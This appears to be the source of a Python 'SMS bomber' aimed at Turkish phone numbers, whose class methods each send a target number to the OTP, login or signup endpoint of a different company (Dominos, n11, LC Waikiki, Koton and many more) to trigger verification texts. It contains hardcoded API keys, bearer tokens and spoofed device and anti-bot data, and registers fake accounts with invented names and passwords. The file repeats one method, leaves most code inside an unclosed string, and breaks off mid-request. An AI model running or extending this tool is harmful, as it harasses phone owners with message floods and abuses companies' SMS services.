from pickle import FALSE
import requests
from random import choice
from string import ascii_lowercase
from colorama import Fore, Style
false = False
true = True

class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"




    #service.petopy.com by ever0ne
    def Petopy(self):
        try:
            site = requests.post("https://service.petopy.com/api/auth/send-sms", 
                                   headers={"User-Agent":"okhttp/5.0.0-alpha.10","locale":"tr"},  
                                   json={"country_code": "+90","phone": "5523621482","opt_sms": false,"security_code": "B74FDDEC18B11B4E8E428FB48AB6D"})
            print(site.json())
            if site.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Petopy by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Petopy by ever0ne")

    #service.petopy.com by ever0ne
    def Petopy(self):
        try:
            site = requests.post("https://service.petopy.com/api/auth/send-sms", 
                                   headers={"User-Agent":"okhttp/5.0.0-alpha.10","locale":"tr"},  
                                   json={"country_code": "+90","phone": "5523621482","opt_sms": false,"security_code": "B74FDDEC18B11B4E8E428FB48AB6D"})
            print(site.json())
            if site.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Petopy by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Petopy by ever0ne")
"""
    #api.kunduz.com by ever0ne
    def Kunduz(self):
        try:
            kunduz = requests.post("https://api.kunduz.com/auth/login/otp/",  json={"phone_number": {"country_code": 1,"number": self.phone}})
            print(kunduz.json())
            if kunduz.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kunduz by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kunduz by ever0ne")


    #underarmour.com.tr by ever0ne
    def UnderArmour(self):
        try:
            underarmour = requests.post("https://www.underarmour.com.tr/users/register/", 
                                   headers={"User-Agent":"okhttp/4.10.0"},  
                                   json={"first_name": "ahmet","last_name": "bilen","email": self.mail,"password": "asd12Assss","phone": f"0{self.phone}","confirm": "true","sms_allowed": "true","email_allowed": "false","call_allowed": "false"})
            if underarmour.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> UnderArmour by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> UnderArmour by ever0ne")


    #apigw.chippin.com by ever0ne
    def Chippin(self):
        try:
            underarmour = requests.post("https://apigw.chippin.com/gsmVerification/generateGsmVerificationCode", 
                                   headers={"DeviceId":"76e95ca596a1eb1b","User-Agent":"okhttp/4.10.0"},  
                                   json={"gsm": self.phone})
            if underarmour.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Chippin by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Chippin by ever0ne")

            
    #vakko.com by ever0ne
    def Vakko(self):
        try:
            vakkoget = requests.get("https://www.vakko.com/csrf_token/?format=json")
            csrftoken = (vakkoget.cookies.get_dict()["csrftoken"])
            vakko = requests.post("https://www.vakko.com/vakko_app/users/registration/?format=json", 
                            
                                   headers={"Cookie":f"sessionid={vakkoget.cookies.get_dict()['sessionid']};csrftoken={csrftoken}","x-csrftoken": vakkoget.json()["csrf_token"],"X-App-Device":"android","User-Agent":"okhttp/4.10.0","Content-Type":"application/json"},  
                                   json={"call_allowed": false,"confirm": true,"confirm_kvkk": true,"csrfmiddlewaretoken": vakkoget.json()["csrf_token"],"date_of_birth": "1999-01-01","email": self.mail,"email_allowed": false,"first_name": "AHMET","last_name": "BİLEN","password": "asdasd123A","phone": f"0{self.phone}","sms_allowed": false})
            if vakko.json()['success'] == 'SMS gönderildi.':
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Vakko by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Vakko by ever0ne")


    #frontend.dominos.com.tr by ever0ne
    def Dominos(self):
        try:
            dominos = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode", 
                                   headers={"authorization":"Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.BX34qfKYOZ6bx1UPMhB3de2qFM-R1l1oXpyKa_NzURkE3dI4qGGe5Q.Sa1Vih4fIDr6yxCcyHj2wA.qVyAYNf9nNOCCrmJAvZgl889UtmkyipBLMeWblJ8AQXolqMpuXoA8Ukx1DZKkLJ8BC8QAXn3oW3x52D51SFVp9FUeOE0cJwvd4Z5LUxypuuAECw4IkFqZ231da05z0JXidpdiLhT_mFjXj4iBD7D8bEQ5uMnVyLB6HKzRMJZl129iXjr1CxHdoZDkaN3aSv_7W7MQHHW7xihXurLnQcfe7I5exyOV_QQRoKlA9H04UHSNMDc2Gzs6alg9YGY7AOD-FtKePCTS-SPU6nz_yE7L7JeuG2KwIK4R3hmSHOlYSTNVG8SeXhGFyguAke_mQf7a6ocy-NumDSE39Eya6JqT6_pJc1uiidzGlPcBoRLVfhxRp0qsK5Wf5itAWg0q3ztc1T-daAMYUjlsc50rrNBjxpr4hfLoX2EXmAlN5t7We6T8K0cDtNxfNlkktrPMNpa3KeiHrqq0RehSrPC3X_i2RWGZjsm8Bjpywl6rcFHxLZZiDp1rdVuQrTdY1NQz5m_JzTWKg0GqXsrgeQp_aFDeQ.GPze6IpDWf5zyBzgI2kHpw","User-Agent":"okhttp/4.10.0"},  
                                   json={"mobilePhone": self.phone,"isSure": "true","email": self.mail})
            if dominos.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Dominos by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Dominos by ever0ne")

            


            
    #mobileapi-redesign.boyner.com.tr by ever0ne
    def Boyner(self):
        try:
            boyner = requests.post("https://mobileapi-redesign.boyner.com.tr/mobile2/mbUser/RegisterUser", 
                                   headers={"User-Agent":"okhttp/4.10.0"},  
                                   json={"Main": {"CellPhone": self.phone,"Email": self.mail,"firstname": "ahmet","GenderID": 0,"lastname": "bilen","password": "asd21s","ReceiveCampaignMessages": "false"}})
            if boyner.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Boyner by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Boyner by ever0ne")

            
    #mobileapp.lcwaikiki.com by ever0ne
    def LcWaikiki(self):
        try:
            waikiki = requests.post("https://mobileapp.lcwaikiki.com/mobile/apigateway/api/v1/preRegister.json", 
                                   headers={"User-Agent":"lcwaikikimobileapp/3.3.87 (samsung SM-N975F; Android 9 (28))","X-acf-sensor-data":"2,a,YSmsPNCY2WblfqHXMgEoHoyVnIev8f1Qeovn15secBeDuj68J0gflMWkpuDUKPEKuKCFPw6Egz0O6MCz/55dn/eSuYrDLVZRDiNBAbu2elKTfMI87EBhs39jR2k7ULFRRoRGjsGzBctn1ye9KINHu+roUDJQ+XnNZQR+A5SRdSo=,AiYiP/J+38ZFhZQEXMu3bLus6FL6k96IH7Yjjt64901OvjUh5lTh9RblqhjbjoIEGjSvmP5vlZ+J713kFHhl0tdqwcn5QyJXUPMJw7/aOSMIR70MN9t72oSRo+v8UP3YWza639UckdOtCE3xPIhoQjGXq/+P2rhesdqW0IXkxtA=$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$1000,0,0$$"},  
                                   json={"email": self.mail,"phoneNumber": self.phone})
            if waikiki.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> LC Waikiki by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> LC Waikiki by ever0ne")

        
        
     
    #wmf.com.tr
    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            })
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
    
    
    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")


    #englishhome.com
    def Englishhome(self):
        try:
            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
    

    #mopas.com.tr
    def Mopas(self):
        try:
            cookies = {"JSESSIONID": "6817377124C666AA59F3E6B0678F124C"}
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Dnt": "1", "Referer": "https://mopas.com.tr/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=", cookies=cookies, headers=headers)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr")
          

    #suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC", "User-Agent": "suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4", "Accept-Language": "en"}
            data = {"action": "register", "gsm": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
                
    
    #KimGbIster
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"})
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
            

    #tazi.tech
    def Tazi(self):
        try:
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
            json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["kod"]) == "0000":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")
            
    
    #n11.com
    def N11(self):
        try:
            url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
            headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
            json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": self.phone, "userType": "BUYER"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["isSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.n11.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com")
            
        
    #marti.tech
    def Marti(self):
        try:
            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
            json={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
            r = requests.post(url,  json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")


    #macrocenter.com.tr
    def Macro(self):
        try:
            url = "https://rest.macrocenter.com.tr:443/users/login/otp"
            headers = {"Content-Type": "application/json", "X-Device-Platform": "IOS", "X-Request-Identifier": "2C1B6BBB-3E1E-4E7E-9CAE-990C6EAAD279", "Accept": "*/*", "X-Device-Model": "iPhone 7 Plus", "X-Store-Ids": "", "X-Device-Version": "2.3.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-Device-Platform-Version": "15.7.7", "User-Agent": "Macrocenter/15 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Identifier": "C7CF9525-9BEB-47B0-87EF-FAFA9F778C3E", "X-Device-Latitude": "", "X-Device-Longitude": "", "X-Device-Type": "MOBILE"}
            json={"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.macrocenter.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.macrocenter.com.tr")


    #tiklagelsin.com
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
    

    #ayyildiz.com.tr
    def Ayyildiz(self):
        try:
            url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
            headers = {"Accept": "*/*", "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS", "Devicetype": "mobileapp", "Accept-Encoding": "gzip, deflate", "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"}
            r = requests.post(url, headers=headers)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.altinyildizclassics.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.altinyildizclassics.com")


    #naosstars.com
    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
            json={"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")


    #koton.com
    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; 